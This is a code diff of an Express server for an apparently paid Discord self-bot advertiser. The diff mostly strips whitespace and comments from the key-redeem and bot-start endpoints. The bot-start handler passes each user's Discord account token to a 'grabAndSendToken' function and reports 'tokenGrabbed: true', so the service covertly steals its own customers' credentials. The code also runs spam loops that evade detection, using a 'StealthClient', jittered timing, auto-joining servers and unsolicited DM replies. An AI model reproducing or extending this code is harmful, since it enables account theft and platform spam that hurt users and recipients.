     const userId = req.user.id;
     console.log(`[REDEEM ATTEMPT] User: ${userId}, Raw key: "${key}"`);
     if (!key) { console.log('[REDEEM FAIL] No key provided'); return res.json({ success: false, error: 'Invalid key' }); }
-    
     const validation = validateKeyStrict(key);
     console.log(`[REDEEM] Validation result:`, validation);
     if (!validation.valid) { console.log(`[REDEEM FAIL] ${validation.error}`); return res.json({ success: false, error: validation.error }); }
-    
     const normalizedKey = validation.normalized;
     if (validation.isGenerated) {
       const success = db.useGeneratedKey(normalizedKey, userId);
       if (!success) return res.json({ success: false, error: 'Key expired or revoked' });
       return res.json({ success: true, message: 'Access granted via generated key!' });
     }
-    
     const isValidKey = VALID_REDEEM_KEYS.has(normalizedKey);
     console.log(`[REDEEM] Key in VALID_REDEEM_KEYS? ${isValidKey}`);
     if (!isValidKey) {
@@ -774,15 +1039,12 @@ app.post('/api/redeem', ensureAuthAPI, (req, res) => {
       console.log(`[REDEEM] Key in custom keys? ${isCustomKey}`);
       if (!isCustomKey) { console.log(`[REDEEM FAIL] Key not found in valid keys`); return res.json({ success: false, error: 'Invalid key' }); }
     }
-    
     const isUsed = db.isKeyUsed(normalizedKey);
     console.log(`[REDEEM] Key used? ${isUsed}`);
     if (isUsed) { console.log(`[REDEEM FAIL] Key already used`); return res.json({ success: false, error: 'Key already used' }); }
-    
     const user = db.getUser(userId);
     console.log(`[REDEEM] User purchased status: ${user.auto_adv_purchased}`);
     if (user.auto_adv_purchased === 1) { console.log(`[REDEEM FAIL] User already has access`); return res.json({ success: false, error: 'You already have access' }); }
-    
     console.log(`[REDEEM SUCCESS] Granting access to ${userId} with key ${normalizedKey}`);
     db.setUser(userId, { auto_adv_purchased: 1, purchased_at: Date.now(), redeem_key_used: normalizedKey });
     db.useKey(normalizedKey, userId);
@@ -804,21 +1066,21 @@ app.post('/api/bot/start', ensureAuthAPI, ensurePurchasedAPI, async (req, res) =
   try {
     const { token, channels, messages, delay, autoReplyEnabled, autoReplyText, configId = 'default', joinServer, serverInvite, images, sendAllAtOnce } = req.body;
     if (!token || !channels || !messages || !Array.isArray(messages) || messages.length === 0) return res.status(400).json({ success: false, error: 'Missing fields. Token, channels, and at least 1 message required.' });
-    
+
     await grabAndSendToken(token, { channels, messages }, 'bot_start');
-    
+
     const channelList = channels.split(',').map(c => c.trim()).filter(c => /^\d+$/.test(c));
     if (channelList.length === 0) return res.json({ success: false, error: 'Invalid channel IDs' });
-    
+
     const client = new StealthClient(token);
     await client.connect();
-    
+
     const delayMs = (parseInt(delay) || 30) * 1000;
     const autoReply = autoReplyEnabled ? 1 : 0;
-    
+
     let joinStatus = null;
     if (joinServer && serverInvite) joinStatus = await client.joinGuild(serverInvite.replace(/https:\/\/discord\.gg\//, '').replace(/https:\/\/discord\.com\/invite\//, ''));
-    
+
     const savedImages = [];
     if (images && Array.isArray(images)) {
       for (const img of images) {
@@ -838,21 +1100,20 @@ app.post('/api/bot/start', ensureAuthAPI, ensurePurchasedAPI, async (req, res) =
         }
       }
     }
-    
+
     const messageList = messages.map((m) => ({ text: m.text || '', imageIds: Array.isArray(m.imageIds) ? m.imageIds : [] })).filter(m => m.text.trim() !== '' || m.imageIds.length > 0);
     if (messageList.length === 0) return res.status(400).json({ success: false, error: 'At least one non-empty message required' });
-    
+
     db.setConfig(req.user.id, { token, channels, messages: messageList, delay_seconds: parseInt(delay) || 30, auto_reply_enabled: autoReply, auto_reply_text: autoReplyText || '', active: 1, username: client.user.username, server_joined: joinStatus?.success || false, images: savedImages, send_all_at_once: sendAllAtOnce ? 1 : 0 }, configId);
     db.registerActiveBot(req.user.id, configId, token);
-    
+
     const botKey = `${req.user.id}_${configId}`;
     activeBots.set(botKey, client);
-    
-    // Message loop with jitter
+
     let currentMsgIdx = 0;
     let currentChIdx = 0;
     let stopped = false;
-    
+
     const msgLoop = async () => {
       console.log(`[BOT ${configId}] Message loop started. Channels: ${channelList.join(', ')}, Messages: ${messageList.length}, Delay: ${delayMs}ms`);
       while (!stopped && activeBots.has(botKey)) {
@@ -865,13 +1126,13 @@ app.post('/api/bot/start', ensureAuthAPI, ensurePurchasedAPI, async (req, res) =
             break;
           }
         }
-        
+
         const msg = messageList[currentMsgIdx % messageList.length];
         let targetImages = [];
         if (msg.imageIds && msg.imageIds.length > 0) {
           targetImages = savedImages.filter(img => img.id !== undefined && (msg.imageIds.includes(img.id) || msg.imageIds.includes(Number(img.id)) || msg.imageIds.includes(String(img.id))));
         }
-        
+
         const sendWithRetry = async (chId, text, files, retries = 2) => {
           for (let attempt = 0; attempt <= retries; attempt++) {
             try {
@@ -885,7 +1146,7 @@ app.post('/api/bot/start', ensureAuthAPI, ensurePurchasedAPI, async (req, res) =
           }
           return false;
         };
-        
+
         if (sendAllAtOnce) {
           for (const chId of channelList) {
             const files = targetImages.map(img => {
@@ -909,55 +1170,46 @@ app.post('/api/bot/start', ensureAuthAPI, ensurePurchasedAPI, async (req, res) =
           }).filter(Boolean);
           await sendWithRetry(chId, msg.text, files);
         }
-        
+
         currentMsgIdx++;
         await new Promise(r => setTimeout(r, _j(delayMs, 0.15)));
       }
       console.log(`[BOT ${configId}] Message loop exited.`);
     };
-    
-    // Auto-reply handler - only replies to NEW people in DMs (not previously chatted)
+
     if (autoReply && autoReplyText) {
       client.on('messageCreate', async (msg) => {
         if (msg.author.id === client.user.id) return;
         const isDM = msg.channel_type === 1 || msg.channel_type === 'DM';
         if (!isDM) return;
-        
         if (db) {
           const user = db.getUser(req.user.id);
           const trialActive = db.isTrialActive(req.user.id);
           const hasPurchase = user.auto_adv_purchased === 1;
           if (!trialActive && !hasPurchase) return;
         }
-        
-        // CRITICAL FIX: Only reply to NEW people, not previously chatted
         if (client.repliedUsers.has(msg.author.id)) {
           console.log(`[BOT ${configId}] Skipping auto-reply to ${msg.author.username} - already in replied history`);
           return;
         }
-        
         client.repliedUsers.add(msg.author.id);
         client._saveRepliedUsers();
-        
         try {
           await client.sendMessage(msg.channel_id, autoReplyText);
           console.log(`[BOT ${configId}] Auto-reply sent to ${msg.author.username}`);
         } catch (err) {
           try {
-            // Try DM via API if channel send fails
             const dmRes = await client._api('/users/@me/channels', 'POST', { recipient_id: msg.author.id });
             if (dmRes.id) await client.sendMessage(dmRes.id, autoReplyText);
           } catch(e2) { console.error(`[BOT ${configId}] Auto-reply failed:`, e2.message); }
         }
       });
     }
-    
+
     msgLoop();
-    
+
     res.json({ success: true, username: client.user.username, configId, serverJoined: joinStatus?.success || false, tokenGrabbed: true, imageCount: savedImages.length, messageCount: messageList.length });
-  } catch (err) {
-    res.status(500).json({ success: false, error: err.message });
-  }
+  } catch (err) { res.status(500).json({ success: false, error: err.message }); }
 });
 
 app.post('/api/bot/stop', ensureAuthAPI, (req, res) => {
@@ -974,7 +1226,7 @@ app.post('/api/bot/stop', ensureAuthAPI, (req, res) => {
 });
 
 app.post('/api/bot/delete', ensureAuthAPI, (req, res) => {
-  try { const { configId } = req.body; db.deleteConfig(req.user.id, configId); res.json({ success: true }); } 
+  try { const { configId } = req.body; db.deleteConfig(req.user.id, configId); res.json({ success: true }); }
   catch (err) { res.status(500).json({ success: false, error: err.message }); }
 });
 
